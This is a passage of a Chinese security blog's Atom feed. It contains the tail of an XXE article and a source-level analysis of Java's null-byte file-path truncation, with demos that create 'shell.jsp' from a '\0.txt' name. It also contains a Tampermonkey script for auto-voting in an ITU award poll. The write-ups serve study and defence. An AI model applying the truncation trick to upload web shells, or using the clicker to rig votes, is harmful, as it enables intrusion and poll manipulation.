src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/func_startEntity.png" alt></p><p>最后会调用setupCurrentEntity()创建连接并发起请求，以获取外部实体的内容，这时XXE漏洞将会触发！</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/setupCurrentEntity.png" alt="setupCurrentEntity触发XXE漏洞"></p><p>最终调用链如下图所示</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/DOMXXETest.png" alt></p><h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul><li><a href="https://github.com/gyyyy/footprint/blob/master/articles/2018/xxe-injection-overview.md" target="_blank" rel="noopener">XXE注入漏洞概述</a></li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间微信支付JDK又出现了XXE漏洞，原因是对前一个XXE漏洞没有修复成功。细思深层原因，是因为对Java JDK提供的API函数理解不正确，导致误用函数进行防御。我不禁思考了以下问题:&lt;/p&gt;
&lt;p&gt;1.Java中XXE漏洞的深层原理是什么？&lt;/p&gt;
&lt;p&gt;2.以下代
      
    
    </summary>
    
      <category term="漏洞原理" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="XXE" scheme="http://gv7.me/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>从代码层面理解java的00截断漏洞深入篇</title>
    <link href="http://gv7.me/articles/2019/java-00-truncation-detail/"/>
    <id>http://gv7.me/articles/2019/java-00-truncation-detail/</id>
    <published>2019-01-22T11:55:10.000Z</published>
    <updated>2019-02-16T18:03:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>4个月前写了一篇文章叫<a href="http://gv7.me/articles/2018/java-00-truncation/">《从代码层面理解java的00截断漏洞》</a>，由于当时出差新疆没时间深入，便在文末立了个有空继续深入的flag。今天我们通过跟踪jdk代码， <strong>彻底搞清楚java中00截断的原理，以及它之后版本是如何修复的？</strong></p><h2 id="一、漏洞测试代码改进"><a href="#一、漏洞测试代码改进" class="headerlink" title="一、漏洞测试代码改进"></a>一、漏洞测试代码改进</h2><p>看了一些java web系统文件上传代码，基本都是使用<code>FileOutputStream</code>来实现对上传内容的保存。于是将上篇文章的测试代码修改如下，简单模拟java的文件上传。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String filepath = <span class="string">"c://shell.jsp"</span> + (<span class="keyword">char</span>)<span class="number">0</span> + <span class="string">".txt"</span>;</span><br><span class="line">        String content = <span class="string">"Test by c0ny1"</span>;</span><br><span class="line">        System.out.println(filepath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(filepath);</span><br><span class="line">            fos.write(content.getBytes());</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过在漏洞版本和非漏洞版本运行以上代码，可知如果00截断成功，则会在系统的c盘根目录新建一个内容为<code>Test by c0ny1</code>的<code>shell.jsp</code>，如果没有截断成功，则抛出<code>Invalid file path</code>异常。</p><h2 id="二、漏洞是如何产生的"><a href="#二、漏洞是如何产生的" class="headerlink" title="二、漏洞是如何产生的?"></a>二、漏洞是如何产生的?</h2><p>我选择使用<code>JDK1.7.0</code>（JDK1.7第一个版本），来跟踪漏洞测试代码从运行到触发。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-01.png" alt="第一个构造函数"></p><p>将传进来的name参数作为路径，新建了File对象，再次传入到<code>FileOutputStream</code>对象新的构造函数。根据传入的两个参数的类型，我们可以确定会进入到以下这个构造函数。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-02.png" alt="第二个构造函数"></p><p>FileOutputStream对象的构造方法又调用了open函数，打开了name参数传进来的文件路径，我们继续跟进open函数。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-03.png" alt="open方法的声明"></p><p>发现open函数是一个native method。它的实现体是由非java语言（c语言）实现的。只能去OpenJDK官网下载jdk源码来查看它的实现。无奈没有找到jdk7u1的源码，只找到了<a href="https://download.java.net/openjdk/jdk7u75/ri/openjdk-7u75-src-b13-18_dec_2014.zip" target="_blank" rel="noopener">jdk7u75</a>的源码。其实在小版本上源码应该区别不大。</p><p>在<code>\openjdk\jdk\src\windows\native\java\io\FileOutputStream_md.c</code>中找到了<code>FileOutputStream</code>类的<code>open</code>方法的JNI实现。open方法又调用了<code>fileOpen</code>方法，继续跟进fileOpen方法。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-04.png" alt="open方法的定义"></p><p>在<code>io_util_md.c</code>中找到了<code>fileOpen</code>方法的定义。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-05.png" alt="fileOpen方法的定义"></p><p>fileOpen方法调用了<code>winFileHandleOpen</code>函数，继续跟进。由于winFileHandleOpen函数代码比较多，这里精简出了关键代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jlong <span class="title">winFileHandleOpen</span><span class="params">(JNIEnv *env, jstring path, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> (onNT) &#123; <span class="comment">//如果在Windows NT/Windows 2000操作系统下</span></span><br><span class="line">        WCHAR *pathbuf = pathToNTPath(env, path, JNI_TRUE);</span><br><span class="line">        <span class="keyword">if</span> (pathbuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">/* Exception already pending */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        h = CreateFileW(</span><br><span class="line">            pathbuf,            <span class="comment">/* Wide char path name */</span></span><br><span class="line">            access,             <span class="comment">/* Read and/or write permission */</span></span><br><span class="line">            sharing,            <span class="comment">/* File sharing flags */</span></span><br><span class="line">            <span class="literal">NULL</span>,               <span class="comment">/* Security attributes */</span></span><br><span class="line">            disposition,        <span class="comment">/* creation disposition */</span></span><br><span class="line">            flagsAndAttributes, <span class="comment">/* flags and attributes */</span></span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">free</span>(pathbuf);<span class="comment">//创建文件</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        WITH_PLATFORM_STRING(env, path, _ps) &#123;</span><br><span class="line">            h = CreateFile(_ps, access, sharing, <span class="literal">NULL</span>, disposition,flagsAndAttributes, <span class="literal">NULL</span>);<span class="comment">//创建文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        END_PLATFORM_STRING(env, _ps);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">return</span> (jlong)h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读以上代码，可知如果在Windows NT/Windows 2000平台下会调用<code>pathToNTPath</code>函数将原始文件路径转化为Windows NT系统合法路径。然而通过阅读该方法源码，发现它并没有对\00字符串进行过滤。如果在其他Window操作系统版本下，则直接使用原始文件路径。</p><p>按照<code>winFileHandleOpen</code>方法的逻辑，无论如何最终都是调用了<code>CreateFileW</code>这个Windows API函数来创建文件。由于这个过程中均未对<code>\00</code>字符串进行过滤，如果传入的文件路径带有\00字符，则<code>CreateFileW</code>函数在创建文件时，路径会被截断。这没什么好说的。</p><p>这里我们没法继续跟进CreateFileW函数，毕竟Windows不开源。为了文章的严谨性，这里我用C语言写一个demo，来证明该函数可以截断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE fileHandle = CreateFileW(<span class="string">L"C:\\shell.jsp\0test.txt"</span>, GENERIC_WRITE, FILE_SHARE_WRITE, <span class="number">0</span>, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span> *data = <span class="string">"Test by c0ny1"</span>;</span><br><span class="line">DWORD a = <span class="built_in">strlen</span>(data);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> b;</span><br><span class="line">WriteFile(fileHandle, data, a, &amp;b, <span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(fileHandle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码运行演示如下：</p><p><img src="/articles/2019/java-00-truncation-detail/show.gif" alt="CreateFileW函数00截断演示"></p><h2 id="三、漏洞是如何修复的？"><a href="#三、漏洞是如何修复的？" class="headerlink" title="三、漏洞是如何修复的？"></a>三、漏洞是如何修复的？</h2><p>这里选择使用<code>jdk1.7.0_80</code>（JDK1.7最新版本），来观察漏洞如果被修复的。</p><p>我们继续按照原来漏洞触发的调用链重新跟踪一遍，跟踪到第二构造函数时，发现多了一个针对文件路径的检查，若检查结果为非法，则抛出异常<code>Invalid file path</code>.</p><p><img src="/articles/2019/java-00-truncation-detail/fix-01.png" alt="构造函数中检查文件路径"></p><p>继续跟进，来到<code>java.io.File</code>类的<code>isInvalid</code>方法,发现该检查函数判断了路径中是否包含00字符串。（注意：java默认编码为Unicode，00字符串的Unicode编码为\u0000）。</p><p><img src="/articles/2019/java-00-truncation-detail/fix-02.png" alt="文件路径检查函数"></p><h2 id="四、漏洞影响的版本范围"><a href="#四、漏洞影响的版本范围" class="headerlink" title="四、漏洞影响的版本范围"></a>四、漏洞影响的版本范围</h2><p>我们知道jdk1.7版本是部分版本存在漏洞的。但这里我们需要确定是哪个版本修复了这个漏洞。翻阅了JDK1.7多个版本代码，发现在JDK1.7.0_40（7u40）开始加上了对文件名是否存在\00字符的检查。也就是说 <strong>JDK1.7.0_40之前java是存在00截断的，而之后的版本就不存在了！</strong></p><p>后面在官网的JDK 7u40的更新日志中也找到了关于00截断问题Bug ID，分别为<code>JDK-8003992</code>和<code>JDK-8011539</code>，具体链接放在了文末的参考文章里了。其实这两个是同一个Bug，官网也说明了它们重复了。</p><p><img src="/articles/2019/java-00-truncation-detail/update_note.png" alt="oracle官方更新日志"></p><h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><ul><li><a href="https://blog.csdn.net/I_S_T_O/article/details/1843871" target="_blank" rel="noopener">JAVA /00文件路径截断漏洞与分析for windows并对.NET比较</a></li><li><a href="https://bugs.java.com/bugdatabase/view_bug.do?bug_id=8003992" target="_blank" rel="noopener">JDK-8003992 : File and other classes in java.io do not handle embedded nulls properly</a></li><li><a href="https://bugs.java.com/bugdatabase/view_bug.do?bug_id=8011539" target="_blank" rel="noopener">JDK-8011539 : File APIs Should Not Allow Null Bytes</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;4个月前写了一篇文章叫&lt;a href=&quot;http://gv7.me/articles/2018/java-00-truncation/&quot;&gt;《从代码层面理解java的00截断漏洞》&lt;/a&gt;，由于当时出差新疆没时间深入，便在文末立了个有空继续深入的flag。今天我们通过跟踪jd
      
    
    </summary>
    
      <category term="漏洞原理" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="00截断" scheme="http://gv7.me/tags/00%E6%88%AA%E6%96%AD/"/>
    
  </entry>
  
  <entry>
    <title>小玩具01:编写WSIS自动投票油猴脚本</title>
    <link href="http://gv7.me/articles/2019/tampermonkey-script-autoclicker/"/>
    <id>http://gv7.me/articles/2019/tampermonkey-script-autoclicker/</id>
    <published>2019-01-11T19:31:11.000Z</published>
    <updated>2019-02-16T18:03:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是1月9号的事了，kang哥在群里发了一个消息，说是需要大家帮忙WSIS奖投票。让每位同事都投一遍。我看了下投票步骤说明文档，其实挺麻烦的。最主要的是足足有18项，需要一个个的点击才能完成。旁边的JackyTsuuuy大佬慢悠悠的蠕动着他性感的小胡须，说道可以尝试使用js自动点击完成这18项选择，还提供了最朴素的几行代码。在他几次怂恿下决定实现这一想法。</p><a id="more"></a><h2 id="一、需求"><a href="#一、需求" class="headerlink" title="一、需求"></a>一、需求</h2><p>当时发的投票步骤说明文档具体需求如下：</p><p>投票页面有18个Category，每完成一个Category的投票就会自动进行下一个Category页面，需要完成所有18个Category的投票。注意：重点在<code>Category5-AL C5</code>选择 <strong>Artificial Intelligence (AI) based spam messages and calls prevention solution</strong> ，其他Category可以任意选。</p><h2 id="二、思路"><a href="#二、思路" class="headerlink" title="二、思路"></a>二、思路</h2><p>判断页面是否有内容为“Artificial Intelligence (AI) based spam messages and calls prevention solution”选项的按钮，如果有就点击，没有就随机选择一个选项。然后进入下一页，等待页面加载完成继续重复上面的操作。其实思路很简单，代码实现也不难，但是细节问题却耐人寻味，想给大家分享下。</p><h2 id="三、实现"><a href="#三、实现" class="headerlink" title="三、实现"></a>三、实现</h2><p>通过前端分析，发现内容为“Artificial Intelligence (AI) based spam messages and calls prevention solution”选项对应着是一个标签名为<code>button</code>，属性<code>value</code>的值为<code>15434938390848023</code>的按钮。</p><p><img src="/articles/2019/tampermonkey-script-autoclicker/positioning-elements.png" alt="分析要点击的页面元素"></p><p>注意：定位选择的属性名和属性值在当前页面是唯一的，这样才能保证点击正确。</p><p>实现定位目标选项的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*定位要点击的页面元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByTAV</span>(<span class="params">t_tag,t_attr,t_value</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByTagName(t_tag);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt;target.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(target[i].getAttribute(t_attr) == t_value)&#123;</span><br><span class="line"><span class="keyword">return</span> target[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> target = getTargetByTAV(<span class="string">"button"</span>,<span class="string">"value"</span>,<span class="string">"15434938390848023"</span>);</span><br></pre></td></tr></table></figure><p>当页面没有内容为<code>Artificial...solution</code>对应的选项时，就随机选择一项点击。分析页面发现每个选项对应的按钮元素都有<code>name=&quot;voteProjectId&quot;</code>,我们以此来定位它们。实现代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code refence: https://www.cnblogs.com/phpyangbo/p/6129868.html</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomNum</span>(<span class="params">Min, Max</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Range = Max - Min;</span><br><span class="line">    <span class="keyword">var</span> Rand = <span class="built_in">Math</span>.random();</span><br><span class="line">    <span class="keyword">var</span> num = Min + <span class="built_in">Math</span>.floor(Rand * Range);  <span class="comment">//舍去</span></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByRandom</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByName(<span class="string">"voteProjectId"</span>);</span><br><span class="line"><span class="keyword">var</span> n = RandomNum(<span class="number">0</span>,target.length);</span><br><span class="line"><span class="keyword">return</span> target[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后呢，为了保证点击成功，我们设置每间隔<code>100ms</code>就重复点击一次。实现代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (button) &#123;</span><br><span class="line">        button.click();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>将以上代码放到浏览器开发者工具的console中执行是可以的，但是会存在一个问题。那就是页面刷新后，我们编写的代码将不会作用于新的页面。为了解决这个问题，当然可以编写一个浏览器插件来解决，但是油猴已经做好了这个工作。我们只需要站在巨人的肩膀上，完成我们的想法即可。</p><p>按照油猴的脚本编写规则，最终源码为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         wsis-auto-vote</span></span><br><span class="line"><span class="comment">// @namespace    http://gv7.me</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  wsis 自动投票，自动投"Artificial Intelligence (AI) based spam messages and calls prevention solution"选项。</span></span><br><span class="line"><span class="comment">// @author       c0ny1</span></span><br><span class="line"><span class="comment">// @match        https://www.itu.int/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    'use strict'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*定位要点击的页面元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByTAV</span>(<span class="params">t_tag,t_attr,t_value</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByTagName(t_tag);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt;target.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(target[i].getAttribute(t_attr) == t_value)&#123;</span><br><span class="line"><span class="keyword">return</span> target[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// code refence: https://www.cnblogs.com/phpyangbo/p/6129868.html</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomNum</span>(<span class="params">Min, Max</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Range = Max - Min;</span><br><span class="line">    <span class="keyword">var</span> Rand = <span class="built_in">Math</span>.random();</span><br><span class="line">    <span class="keyword">var</span> num = Min + <span class="built_in">Math</span>.floor(Rand * Range);  <span class="comment">//舍去</span></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*随机获取一个要点击的页面元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByRandom</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByName(<span class="string">"voteProjectId"</span>);</span><br><span class="line"><span class="keyword">var</span> n = RandomNum(<span class="number">0</span>,target.length);</span><br><span class="line"><span class="keyword">return</span> target[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> btn;</span><br><span class="line">btn = getTargetByTAV(<span class="string">"button"</span>,<span class="string">"value"</span>,<span class="string">"15434938390848023"</span>);</span><br><span class="line"><span class="keyword">if</span>(btn === <span class="literal">undefined</span>)&#123;</span><br><span class="line">    btn = getTargetByRandom();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (btn !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[+] click obj: "</span> + btn.innerHTML);</span><br><span class="line">        btn.click();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'[-] click obj is undefined!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/tampermonkey-script-autoclicker/show.gif" alt="最终效果"></p><h2 id="五、延伸"><a href="#五、延伸" class="headerlink" title="五、延伸"></a>五、延伸</h2><p>刚才是一个具体场景下的代码实现。但是我思考了下，其实我们生活中还有很多场景，可以通过快速重复点击页面元素来解决。比如春节的刷票，大学的抢课，双11的抢购等等。也许有人有疑问，使用burp多次重放数据包不就可以了么？其实这样不一定行，因为请求可能需要提交token或者其他需要浏览器执行js获取到的数据。</p><p>于是我改基于以上代码，编写了一个适合更多场景下快速重复点击页面元素的油猴脚本。该脚本已经在油猴的在线脚本库Greasy Fork发布了，想看最新源码或者使用的朋友<a href="https://greasyfork.org/zh-CN/scripts/376507-autoclicker" target="_blank" rel="noopener">请点击这里</a>。</p><p>该脚本提供了通过以下几种方式获取需要点击的页面元素：</p><table><thead><tr><th align="center">序号</th><th align="left">定位方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">id</td><td align="left">提供页面要点击元素的id，赋值给id变量即可</td></tr><tr><td align="center">2</td><td align="left">标签名，属性，属性值</td><td align="left">提供页面要点击元素的标签名，属性，属性值分别给tag，attr，value即可</td></tr><tr><td align="center">3</td><td align="left">xpath</td><td align="left">提供页面要点击元素的xpath，赋值给str_xpath变量即可</td></tr><tr><td align="center">4</td><td align="left">selector</td><td align="left">提供页面要点击元素的selector，赋值给str_qs变量即可</td></tr><tr><td align="center">5</td><td align="left">自定义定位函数</td><td align="left">以上方式无法定位到目标元素，可以将isCustom变量赋值为true，同时编写getTargetByCustom函数的函数体，返回定位成功的元素即可</td></tr></tbody></table><p>具体使用方法请移步<a href="https://greasyfork.org/zh-CN/scripts/376507-autoclicker" target="_blank" rel="noopener">Greasy Fork</a>。</p><h2 id="六、最后"><a href="#六、最后" class="headerlink" title="六、最后"></a>六、最后</h2><p>最后给大家留一个思考： <strong>该如何权衡我们脚本点击提交的速度和成功率？</strong></p><ol><li>如果我们的脚本点击按钮过快，可能表单某些必要的值（比如token，需要每次发送ajax请求来更新）还没有被加载。从而导致提交失败。</li><li>如果等待所有资源都加载完成，然后脚本在进行点击操作，这样又太慢展现不了脚本的优势（比如抢购场景下）。</li></ol><p>考虑这些特殊情况，会让我们的脚本更加壮硕，欢迎留言讨论。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是1月9号的事了，kang哥在群里发了一个消息，说是需要大家帮忙WSIS奖投票。让每位同事都投一遍。我看了下投票步骤说明文档，其实挺麻烦的。最主要的是足足有18项，需要一个个的点击才能完成。旁边的JackyTsuuuy大佬慢悠悠的蠕动着他性感的小胡须，说道可以尝试使用js自动点击完成这18项选择，还提供了最朴素的几行代码。在他几次怂恿下决定实现这一想法。&lt;/p&gt;
    
    </summary>
    
      <category term="小玩具" scheme="http://gv7.me/categories/%E5%B0%8F%E7%8E%A9%E5%85%B7/"/>
    
    
      <category term="油猴脚本" scheme="http://gv7.me/tags/%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
</feed>
